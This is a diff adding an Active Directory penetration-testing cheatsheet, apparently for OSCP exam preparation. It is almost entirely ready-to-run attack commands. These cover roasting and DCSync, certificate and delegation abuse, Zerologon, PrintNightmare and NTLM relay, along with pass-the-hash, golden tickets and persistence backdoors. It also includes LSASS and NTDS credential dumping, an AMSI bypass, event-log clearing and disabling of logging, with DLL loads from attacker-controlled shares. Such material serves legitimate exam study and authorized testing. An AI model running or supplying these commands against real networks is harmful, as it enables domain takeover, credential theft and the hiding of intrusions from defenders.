@@ -650,3 +650,384 @@
 │ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe │
 │                                                                                   │
 ╚══════════════════════════════════════════════════════════════════════════════════╝
+
+
+╔══════════════════════════════════════════════════════════════════════════════════╗
+║               COMPLETE ACTIVE DIRECTORY PENETRATION TESTING CHEATSHEET          ║
+║               ALL SCENARIOS + ALL ATTACKS + FULL WORKFLOW                       ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+╔══════════════════════════════════════════════════════════════════════════════════╗
+║                               SCENARIO 1: NO CREDENTIALS                        ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ STEP 1: PORT SCANNING                                                            │
+│   nmap -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,5986,9389 -oA initial TARGET │
+│                                                                                   │
+│ STEP 2: CHECK ANONYMOUS ACCESS                                                    │
+│   ldapsearch -x -H ldap://TARGET -b "" -s base                                    │
+│   smbclient -L //TARGET -N                                                        │
+│   rpcclient -U "" -N TARGET -c "enumdomusers"                                     │
+│                                                                                   │
+│ STEP 3: ENUMERATE USERS                                                           │
+│   # Method 1: LDAP Anonymous                                                      │
+│   ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d" " -f2 > users.txt │
+│                                                                                   │
+│   # Method 2: RID Brute Force                                                     │
+│   lookupsid.py domain.local/guest:''@TARGET                                       │
+│                                                                                   │
+│   # Method 3: Kerbrute                                                            │
+│   kerbrute userenum -d domain.local --dc TARGET users.txt                         │
+│                                                                                   │
+│ STEP 4: ATTACKS WITH USERNAMES ONLY                                               │
+│   # AS-REP Roasting                                                               │
+│   GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip TARGET -request │
+│   # Crack: hashcat -m 18200 asrep_hash.txt rockyou.txt                           │
+│                                                                                   │
+│   # Password Spraying                                                             │
+│   crackmapexec smb TARGET -u users.txt -p 'Password123' --continue-on-success     │
+│   crackmapexec winrm TARGET -u users.txt -p 'Welcome1' --continue-on-success      │
+│                                                                                   │
+│   # Check SMB Shares                                                              │
+│   smbmap -H TARGET -u '' -p ''                                                    │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                               SCENARIO 2: GUEST ACCESS                          ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ # SMB with Guest                                                                 │
+│ smbclient -L //TARGET -U guest                                                   │
+│ rpcclient -U "guest" -N TARGET -c "enumdomusers"                                 │
+│                                                                                   │
+│ # Lookup SIDs                                                                    │
+│ lookupsid.py domain.local/guest:''@TARGET                                        │
+│                                                                                   │
+│ # AS-REP with Guest                                                              │
+│ GetNPUsers.py domain.local/guest:'' -usersfile users.txt -dc-ip TARGET -request  │
+│                                                                                   │
+│ # Check Shares                                                                   │
+│ netexec smb TARGET -u guest -p '' --shares                                       │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                               SCENARIO 3: USER CREDENTIALS                      ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ # Full LDAP Enum                                                                 │
+│ ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=local" -D "user@domain.local" -w 'password' "(objectClass=user)" │
+│                                                                                   │
+│ # Kerberoasting                                                                  │
+│ GetUserSPNs.py -request -dc-ip TARGET domain.local/user:password                 │
+│ # Crack: hashcat -m 13100 tgs_hash.txt rockyou.txt                              │
+│                                                                                   │
+│ # BloodHound Collection                                                          │
+│ bloodhound-python -d domain.local -u user -p password -c All -ns TARGET --zip    │
+│                                                                                   │
+│ # Shell Access                                                                   │
+│ evil-winrm -i TARGET -u user -p password                                         │
+│ psexec.py domain.local/user:password@TARGET                                      │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                               SCENARIO 4: HAVE SHELL                            ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ # Windows Checks                                                                 │
+│ whoami /priv                                                                     │
+│ net user %USERNAME% /domain                                                      │
+│ net group "Domain Admins" /domain                                                │
+│                                                                                   │
+│ # Upload Tools                                                                   │
+│ copy \\KALI_IP\share\winPEASany.exe C:\Windows\Temp\                             │
+│ .\winPEASany.exe                                                                 │
+│                                                                                   │
+│ # Local PrivEsc Windows                                                          │
+│ # Check for SeImpersonate: JuicyPotato.exe -t * -p cmd.exe                       │
+│ # Unquoted paths: wmic service get name,pathname | findstr /i "auto" | findstr /i /v "c:\windows\\" │
+│                                                                                   │
+│ # Linux Checks                                                                   │
+│ sudo -l                                                                          │
+│ find / -perm -4000 -type f 2>/dev/null                                           │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                          COMPLETE ATTACKS LIST - ALL ESC TECHNIQUES             ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ 1. AS-REP ROASTING                                                               │
+│   GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP -request │
+│   GetNPUsers.py domain.local/svc_backup -no-pass -dc-ip DC_IP -request           │
+│   Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt                      │
+│                                                                                   │
+│ 2. KERBEROASTING                                                                 │
+│   GetUserSPNs.py -request -dc-ip DC_IP domain.local/user:password               │
+│   GetUserSPNs.py -request -dc-ip DC_IP domain.local/user -hashes :NTLM_HASH     │
+│   export KRB5CCNAME=ticket.ccache; GetUserSPNs.py -request -dc-ip DC_IP domain.local/ -k -no-pass │
+│   Rubeus.exe kerberoast /outfile:tgs.txt                                         │
+│                                                                                   │
+│ 3. DCSYNC ATTACK                                                                 │
+│   impacket-secretsdump domain.local/user:password@DC_IP                         │
+│   impacket-secretsdump -just-dc-user krbtgt domain.local/user:password@DC_IP    │
+│   mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt                  │
+│                                                                                   │
+│ 4. ACL ABUSES                                                                    │
+│   # GenericAll on user                                                           │
+│   Set-DomainUserPassword -Identity TargetUser -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force) │
+│                                                                                   │
+│   # GenericAll on group                                                          │
+│   Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'            │
+│                                                                                   │
+│   # WriteDACL on domain                                                          │
+│   Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync │
+│                                                                                   │
+│   # WriteOwner on object                                                         │
+│   Set-DomainObjectOwner -Identity TargetObject -OwnerIdentity attacker           │
+│   Add-DomainObjectAcl -TargetIdentity TargetObject -PrincipalIdentity attacker -Rights ResetPassword │
+│                                                                                   │
+│ 5. RBCD (RESOURCE-BASED CONSTRAINED DELEGATION)                                  │
+│   # Check machine account quota                                                  │
+│   Get-DomainObject -Identity "DC=domain,DC=local" -Properties ms-DS-MachineAccountQuota │
+│                                                                                   │
+│   # Create fake computer                                                         │
+│   New-MachineAccount -MachineAccount FAKECOMPUTER -Domain domain.local -DomainController DC01.domain.local │
+│                                                                                   │
+│   # Set RBCD on target                                                           │
+│   Set-DomainObject -Identity TARGET$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=@('FAKECOMPUTER$')} │
+│                                                                                   │
+│   # Get S4U2Proxy ticket                                                         │
+│   Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /ptt │
+│                                                                                   │
+│ 6. UNCONSTRAINED DELEGATION                                                      │
+│   Get-DomainComputer -Unconstrained                                              │
+│   Rubeus.exe monitor /interval:5 /filteruser:DC01$                              │
+│   Rubeus.exe dump /service:krbtgt /nowrap                                       │
+│   Rubeus.exe ptt /ticket:BASE64_TICKET                                          │
+│                                                                                   │
+│ 7. CONSTRAINED DELEGATION                                                        │
+│   Get-DomainUser -TrustedToAuth                                                  │
+│   Get-DomainComputer -TrustedToAuth                                              │
+│   Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/DC01.domain.local /ptt │
+│                                                                                   │
+│ 8. AD CS ESC1 (Certificate Template Misconfiguration)                            │
+│   certipy find -u user@domain.local -p 'password' -dc-ip DC_IP                   │
+│   certipy req -u user@domain.local -p 'password' -ca CA-NAME -target DC01.domain.local -template VULN-TEMPLATE -upn Administrator@domain.local │
+│   certipy auth -pfx administrator.pfx -dc-ip DC_IP                              │
+│                                                                                   │
+│ 9. AD CS ESC8 (NTLM Relay to HTTP Cert Enrollment)                               │
+│   ntlmrelayx.py -t http://DC01.domain.local/certsrv/certfnsh.asp --adcs --template DomainController │
+│   python3 PetitPotam.py -d domain.local -u user -p password ATTACKER_IP DC01.domain.local │
+│   certipy auth -pfx DC.pfx -dc-ip DC_IP                                         │
+│                                                                                   │
+│ 10. NO PAC (CVE-2021-42278/42287)                                                │
+│   New-MachineAccount -MachineAccount FAKEDC -Domain domain.local                 │
+│   Set-DomainObject -Identity FAKEDC -Clear sAMAccountName                        │
+│   Set-DomainObject -Identity FAKEDC -Set @{sAMAccountName='DC01$'}               │
+│   Rubeus.exe asktgt /user:DC01$ /domain:domain.local /password:FAKEDC_PASSWORD /ptt │
+│   Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/DC01.domain.local /ptt │
+│                                                                                   │
+│ 11. DNSADMINS ATTACK                                                            │
+│   net group "DNSAdmins" /domain                                                  │
+│   dnscmd DC01 /config /serverlevelplugindll \\ATTACKER\share\malicious.dll       │
+│   sc \\DC01 stop dns                                                             │
+│   sc \\DC01 start dns                                                            │
+│                                                                                   │
+│ 12. BADSUCCESSOR (Windows Server 2025 dMSA)                                      │
+│   .\BadSuccessor.exe find                                                        │
+│   .\BadSuccessor.exe escalate -targetOU "OU=Staff,DC=domain,DC=com" -dmsa dmsa_pwn -targetUser "CN=Administrator,CN=Users,DC=domain,DC=com" -dnshostname dmsa_pwn -user username -dc-ip DC_IP │
+│   .\Rubeus.exe hash /password:PASSWORD /user:USER /domain:DOMAIN                 │
+│   # Tunnel port 88 to Kali                                                       │
+│   faketime -f "+7h" impacket-getST -aesKey AES256_HASH -impersonate 'dmsa_pwn$' -dmsa DOMAIN/USER -spn krbtgt/DOMAIN -dc-ip 127.0.0.1 -ts │
+│   # Extract Administrator hash from "Previous keys" output                       │
+│   evil-winrm -i DC_IP -u Administrator -H NTLM_HASH                              │
+│                                                                                   │
+│ 13. PRINTNIGHTMARE                                                               │
+│   python3 CVE-2021-1675.py domain.local/user:password@DC_IP '\\ATTACKER\share\malicious.dll' │
+│                                                                                   │
+│ 14. ZEROLOGON                                                                    │
+│   python3 zerologon.py DC01 DC_IP                                                │
+│   secretsdump.py -just-dc -no-pass DC01\$@DC_IP                                  │
+│                                                                                   │
+│ 15. SMB RELAY                                                                    │
+│   ntlmrelayx.py -t smb://TARGET2 -smb2support                                    │
+│   ntlmrelayx.py -t ldap://DC_IP --add-computer                                   │
+│   python3 PetitPotam.py -d domain.local -u user -p password ATTACKER_IP DC01     │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                          LATERAL MOVEMENT TECHNIQUES                           ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ 1. PASS-THE-HASH                                                                │
+│   crackmapexec smb TARGET -u Administrator -H NTLM_HASH                         │
+│   impacket-psexec domain.com/Administrator@TARGET -hashes :NTLM_HASH            │
+│   evil-winrm -i TARGET -u Administrator -H NTLM_HASH                            │
+│                                                                                   │
+│ 2. PASS-THE-TICKET                                                               │
+│   Rubeus.exe dump /nowrap                                                        │
+│   export KRB5CCNAME=ticket.ccache                                                │
+│   impacket-psexec domain.com/Administrator@TARGET -k -no-pass                    │
+│                                                                                   │
+│ 3. OVERPASS-THE-HASH                                                            │
+│   Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:NTLM_HASH /ptt  │
+│                                                                                   │
+│ 4. GOLDEN TICKET                                                                 │
+│   ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain domain.com Administrator -duration 5256000 │
+│   mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:SID /krbtgt:KRBTGT_HASH /ptt │
+│   export KRB5CCNAME=Administrator.ccache                                         │
+│                                                                                   │
+│ 5. SILVER TICKET                                                                 │
+│   mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:SID /target:DC01.domain.com /service:cifs /rc4:SERVICE_HASH /ptt │
+│                                                                                   │
+│ 6. WINRM                                                                         │
+│   evil-winrm -i TARGET -u user -p password                                       │
+│   evil-winrm -i TARGET -u user -H NTLM_HASH                                      │
+│                                                                                   │
+│ 7. RDP                                                                           │
+│   xfreerdp /v:TARGET /u:user /p:password /dynamic-resolution                     │
+│   xfreerdp /v:TARGET /u:user /pth:NTLM_HASH                                      │
+│                                                                                   │
+│ 8. SCHEDULED TASKS                                                               │
+│   schtasks /create /s TARGET /u user /p password /tn backdoor /tr "cmd.exe" /sc once /st 00:00 │
+│                                                                                   │
+│ 9. SERVICE CREATION                                                              │
+│   sc \\TARGET create backdoor binPath= "cmd.exe /c whoami"                       │
+│   sc \\TARGET start backdoor                                                     │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                          PERSISTENCE TECHNIQUES                                 ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ 1. GOLDEN TICKET                                                                 │
+│   ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain domain.com Administrator -duration 5256000 │
+│                                                                                   │
+│ 2. SILVER TICKET                                                                 │
+│   mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:SID /target:DC01.domain.com /service:cifs /rc4:SERVICE_HASH /ptt │
+│                                                                                   │
+│ 3. DSRM PERSISTENCE                                                              │
+│   ntdsutil "set dsrm password" "reset password on server null" q q               │
+│   reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f │
+│   psexec.exe -s \\DC01 cmd.exe                                                   │
+│                                                                                   │
+│ 4. SSP PERSISTENCE                                                               │
+│   mimikatz # misc::memssp                                                       │
+│   copy mimilib.dll C:\Windows\System32\                                          │
+│   reg add "HKLM\System\CurrentControlSet\Control\Lsa\" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f │
+│                                                                                   │
+│ 5. SCHEDULED TASKS                                                               │
+│   schtasks /create /tn "Backdoor" /tr "cmd.exe /c whoami > C:\Windows\Temp\backdoor.txt" /sc minute /mo 1 /ru SYSTEM │
+│                                                                                   │
+│ 6. WMI EVENT SUBSCRIPTION                                                        │
+│   $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="BackdoorFilter"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"} │
+│   $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="BackdoorConsumer"; CommandLineTemplate="cmd.exe /c whoami > C:\Windows\Temp\backdoor.txt"} │
+│   Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$Filter; Consumer=$Consumer} │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                          DATA EXFILTRATION                                      ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ 1. LSASS DUMP                                                                    │
+│   procdump.exe -accepteula -ma lsass.exe lsass.dmp                               │
+│   mimikatz # sekurlsa::minidump lsass.dmp                                       │
+│   mimikatz # sekurlsa::logonpasswords                                           │
+│                                                                                   │
+│ 2. NTDS.DIT EXTRACTION                                                           │
+│   ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q                      │
+│   robocopy C:\Temp\ntds\Active\ Domain\ C:\Temp\ntds.dit ntds.dit                │
+│                                                                                   │
+│ 3. REGISTRY HIVES                                                                │
+│   reg save HKLM\SYSTEM system.hive                                               │
+│   reg save HKLM\SAM sam.hive                                                     │
+│   reg save HKLM\SECURITY security.hive                                           │
+│                                                                                   │
+│ 4. DPAPI EXTRACTION                                                              │
+│   mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\* │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                          DEFENSE EVASION                                        ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ 1. AMSI BYPASS                                                                   │
+│   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) │
+│                                                                                   │
+│ 2. LOG CLEARING                                                                  │
+│   wevtutil cl Security                                                           │
+│   wevtutil cl System                                                             │
+│   wevtutil cl Application                                                        │
+│                                                                                   │
+│ 3. POWERSHELL LOGGING DISABLE                                                    │
+│   reg add "HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                          TOOLS INSTALLATION                                     ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ 1. KALI                                                                          │
+│   sudo apt update && sudo apt upgrade -y                                         │
+│   sudo apt install -y impacket-scripts bloodhound-python crackmapexec responder hashcat seclists │
+│   pip3 install --upgrade impacket                                                │
+│   pip3 install bloodhound                                                        │
+│   pip3 install certipy-ad                                                        │
+│   pip3 install ldapdomaindump                                                    │
+│                                                                                   │
+│ 2. WINDOWS TOOLS TO DOWNLOAD                                                     │
+│   # winPEAS: https://github.com/carlospolop/PEASS-ng                             │
+│   # SharpHound: https://github.com/BloodHoundAD/BloodHound                       │
+│   # PowerView: https://github.com/PowerShellMafia/PowerSploit                    │
+│   # Rubeus: https://github.com/GhostPack/Rubeus                                  │
+│   # Mimikatz: https://github.com/gentilkiwi/mimikatz                             │
+│   # Seatbelt: https://github.com/GhostPack/Seatbelt                              │
+│   # BadSuccessor: https://github.com/WayzDev/BadSuccessor                        │
+│   # Chisel: https://github.com/jpillora/chisel                                   │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                          OSCP EXAM STRATEGY                                     ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ MINUTE 0-15: RECON                                                                │
+│   nmap -p 88,389,445,5985 TARGET                                                 │
+│   echo "TARGET_IP domain.local" >> /etc/hosts                                    │
+│   ldapsearch -x -H ldap://TARGET -b "" -s base                                   │
+│                                                                                   │
+│ MINUTE 15-45: INITIAL ACCESS                                                     │
+│   GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip TARGET        │
+│   crackmapexec smb TARGET -u users.txt -p 'Password123'                          │
+│   crackmapexec smb TARGET -u users.txt -p 'Welcome1'                             │
+│                                                                                   │
+│ MINUTE 45-90: POST-COMPROMISE                                                    │
+│   evil-winrm -i TARGET -u user -p password                                       │
+│   .\winPEASany.exe                                                               │
+│   bloodhound-python -d domain.local -u user -p password -c All -ns TARGET        │
+│                                                                                   │
+│ MINUTE 90-180: PRIVESC                                                           │
+│   # Follow BloodHound paths                                                     │
+│   # Try ACL abuses                                                               │
+│   # Try Kerberoasting                                                            │
+│   # Check for delegation                                                         │
+│                                                                                   │
+│ MINUTE 180-240: DOCUMENTATION                                                    │
+│   # Screenshot EVERYTHING                                                        │
+│   # Show user.txt and root.txt                                                   │
+│   # Verify DA access                                                            │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                          TROUBLESHOOTING & TIPS                                 ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ 1. TIME SYNC ISSUES                                                              │
+│   sudo ntpdate -s TARGET                                                         │
+│   faketime -f "+Xh" command                                                      │
+│                                                                                   │
+│ 2. TICKET FORMATS                                                                │
+│   .ccache (Linux) → .kirbi (Windows): kekeo # kerberos::clist "ticket.ccache" /export │
+│   .kirbi → .ccache: kirbi2ccache.py ticket.kirbi ticket.ccache                   │
+│                                                                                   │
+│ 3. COMMON ERRORS                                                                 │
+│   "KDC_ERR_PREAUTH_FAILED": User requires pre-auth                               │
+│   "Clock skew too great": Fix time                                               │
+│   "Cannot contact any KDC": Check -dc-ip and port 88                             │
+│                                                                                   │
+│ 4. ESSENTIAL REMINDERS                                                           │
+│   1. Always enumerate users first                                                │
+│   2. GetNPUsers.py needs -usersfile                                              │
+│   3. Password spraying works in OSCP                                            │
+│   4. BloodHound shows paths                                                     │
+│   5. Screenshot everything                                                       │
+│   6. Try simple attacks first                                                   │
+│                                                                                   │
+╚══════════════════════════════════════════════════════════════════════════════════╝
